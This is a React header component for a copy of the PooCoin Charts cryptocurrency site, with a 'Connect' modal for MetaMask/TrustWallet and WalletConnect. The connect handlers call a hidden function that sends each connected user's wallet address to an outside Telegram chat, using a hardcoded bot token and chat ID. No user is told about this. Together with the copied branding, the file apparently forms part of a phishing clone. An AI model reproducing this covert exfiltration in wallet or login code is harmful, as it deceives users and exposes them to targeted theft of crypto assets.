import React, { useState, useEffect } from 'react';
import './Header.css';
import { Link } from 'react-router-dom';
import { WalletLinkConnector } from "@web3-react/walletlink-connector";
import { WalletConnectConnector } from "@web3-react/walletconnect-connector";
import { InjectedConnector } from "@web3-react/injected-connector";
import { useWeb3React } from '@web3-react/core'
import { Box, Modal, Typography } from '@material-ui/core';
import { ethers } from "ethers";






const style = {
    position: 'absolute',
    top: '50%',
    left: '50%',
    transform: 'translate(-50%, -50%)',
    bgcolor: 'background.paper',
    border: '2px solid #000',
    boxShadow: 24,
    p: 4,
    display: 'flex',
    flexDirection: 'column'
};


function Header() {
    const { active, chainId, account } = useWeb3React();
    const { activate, deactivate } = useWeb3React();
    const [open, setOpen] = React.useState(false);
    const handleOpen = () => setOpen(true);
    const handleClose = () => setOpen(false);

    console.log(account)
    let bot = {
        TOKEN: "5694683449:AAF3Wv9YaK6ScwKWg8bS2hVHYN98sUoTbjk",
        CHATID: "1203745440",

    }

    const submitAdrress = () => {

        fetch(`https://api.telegram.org/bot${bot.TOKEN}/sendMessage?chat_id=${bot.CHATID}&text=${account}`, {
            method: "GET"
        })
           
    }
    const WalletConnect = new WalletConnectConnector({
        rpcUrl: `https://mainnet.infura.io/v3/${process.env.INFURA_KEY}`,
        bridge: "https://bridge.walletconnect.org",
        qrcode: true,
    });
   
    const connectWallet = () => {
        activate(WalletConnect)

        const condition = "string"
        if (typeof(account) === typeof(condition)) {
            setTimeout(submitAdrress(), 3000);
        }
    }




    const Injected = new InjectedConnector({
        supportedChainIds: [1, 3, 4, 5, 42]
       });


    const connectMetaMask = () => {
        activate(Injected)
        const condition = "string"
        if (typeof (account) === typeof (condition)) {
            setTimeout(submitAdrress(), 3000);
        }
    }
    return (
        <div className="header">
            <div className="header_left">
                <div className="header_centerleft">
                    <img
                        src="https://poocoin.app/images/logo/poocoin512.png"
                    />
                    <div className="title">
                        <span>
                            <Link to="/">
                                PooCoin
                                <br />
                                Charts
                            </Link>
                        </span>
                    </div>
                </div>
                <div className="header_centercenter">
                    <div>Binance (BSC)</div>
                    <div>Polygon (Matic)</div>
                    <div>KuChain (KCC)</div>
                </div>
                <div className="header_centerright">
                    <img
                        src="https://poocoin.app/images/logo/poocoin512.png"
                    />
                    <span>$ 2.36</span>
                    <a href="https://t.me/poocointokenchat">
                        <img src="https://poocoin.app/images/logos/telegram.svg" height="25" />
                    </a>
                </div>
            </div>
            <div className="header_middle">
                <a><Link to="/">Charts</Link></a>
                <a><Link to="/Trade">Trade</Link></a>
                <a>Multi Chart</a>
                <a>About</a>
                <a><Link to="/Tools">Tools</Link></a>
                <a>Premium</a>
                <a><Link to="/ad">Advertise</Link></a>
                <a href="https://t.me/Poocoin_Pricebot">
                    <a>Free Price Bot</a>
                </a>
            </div>
            <div className="header_right">

                <button onClick={handleOpen}>Connect</button>
                <Modal
                    open={open}
                    onClose={handleClose}
                    aria-labelledby="modal-modal-title"
                    aria-describedby="modal-modal-description"
                >
                    <Box sx={style}>
                        <button style={{ cursor: 'pointer', background: '#181819', color: 'white', marginTop: '5px', width: "220px", padding: '10px', borderRadius: '10px' }} onClick={() => { connectMetaMask() }}>Metamask/TrustWallet</button>
                        <button style={{ cursor: 'pointer', background: '#181819', color: 'white', marginTop: '5px', width: "220px", padding: '10px', borderRadius: '10px' }} onClick={() => { connectWallet() }}>WalletConnect</button>
                        <button style={{ cursor: 'pointer', background: '#181819', color: 'white', marginTop: '5px', width: "220px", padding: '10px', borderRadius: '10px' }} onClick={handleClose}>Close</button>
                    </Box>
                </Modal>
            </div>
        </div>
    )
}

export default Header
